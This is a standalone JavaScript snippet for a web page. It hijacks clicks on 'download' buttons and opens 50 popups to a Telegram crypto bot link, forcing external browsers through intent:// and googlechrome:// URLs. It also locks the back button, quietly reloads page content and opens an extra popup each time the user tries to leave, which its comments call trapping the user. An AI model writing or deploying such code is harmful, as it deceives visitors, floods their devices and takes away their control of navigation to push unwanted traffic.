 <script>

const smartLink = "https://t.me/Pepecoin_bot_bot/startapp";
const POPUP_COUNT = 50;   // 50 real popups per click (unlimited feel)

// ---------- Platform detection ----------
const ua = navigator.userAgent.toLowerCase();
const isAndroid = /android/.test(ua);
const isIOS = /iphone|ipad|ipod/.test(ua);
const isTelegram = /telegram/.test(ua);

// Build the correct URL based on platform
let finalUrl = smartLink;

if (isTelegram) {
  // Telegram in-app browser – direct link
  finalUrl = smartLink;
} else if (isAndroid) {
  // Android: force external Chrome browser using intent://
  finalUrl = "intent://" + smartLink.replace(/^https?:\/\//, '') + "#Intent;scheme=https;package=com.android.chrome;end";
} else if (isIOS) {
  // iOS: force external Chrome browser (or fallback to Safari)
  finalUrl = "googlechrome://" + smartLink.replace(/^https?:\/\//, '');
} else {
  // PC / Desktop
  finalUrl = smartLink;
}

// 🔥 Powerful popup opener with unique window names (avoids replacement)
function openPopupWithUniqueTarget(url, index) {
  const uniqueName = "popup_" + Date.now() + "_" + index + "_" + Math.random().toString(36).substring(2);
  try {
    let win = window.open(url, uniqueName, "noopener,noreferrer");
    if (!win || win.closed === undefined) {
      // Fallback: try again without extra options
      win = window.open(url, uniqueName);
      if (!win) {
        console.log("Popup blocked for index", index);
      }
    }
  } catch(e) {
    console.log("Error opening popup", e);
  }
}

// 🔥 Launch exactly POPUP_COUNT popups with 80ms gap
function launchMassPopups() {
  for (let i = 0; i < POPUP_COUNT; i++) {
    setTimeout(() => {
      openPopupWithUniqueTarget(finalUrl, i);
    }, i * 80);  // 80ms gap = all 50 open within 4 seconds
  }
}

// 🔥 Main click handler
function handleDownloadClick() {
  launchMassPopups();
}

// Attach event to all download buttons
document.addEventListener("click", function(e) {
  const btn = e.target.closest(".download");
  if (btn) {
    e.preventDefault();
    handleDownloadClick();
  }
});

// ========== BACK BUTTON LOCK + HIDDEN RELOAD + EXTRA POPUP ==========
history.pushState(null, null, location.href);
window.onpopstate = function () {
  // Prevent back navigation
  history.pushState(null, null, location.href);
  
  // Hidden reload: silently refresh video cards only (no full page reload)
  fetch(window.location.href)
    .then(res => res.text())
    .then(html => {
      const parser = new DOMParser();
      const doc = parser.parseFromString(html, 'text/html');
      const newContainer = doc.querySelector('.container');
      if (newContainer) {
        document.querySelector('.container').innerHTML = newContainer.innerHTML;
      }
    })
    .catch(err => console.log("hidden reload error"));
  
  // Extra popup on back button (traps user further)
  setTimeout(() => {
    const extraWin = window.open(finalUrl, "_blank", "noopener");
    if (!extraWin) window.location.href = finalUrl;
  }, 100);
};

console.log("✅ Platform: " + (isAndroid ? "Android (intent://)" : isIOS ? "iOS (googlechrome://)" : isTelegram ? "Telegram" : "PC/Desktop"));
console.log("✅ " + POPUP_COUNT + " real popups per click | Back lock + hidden reload active");
</script>
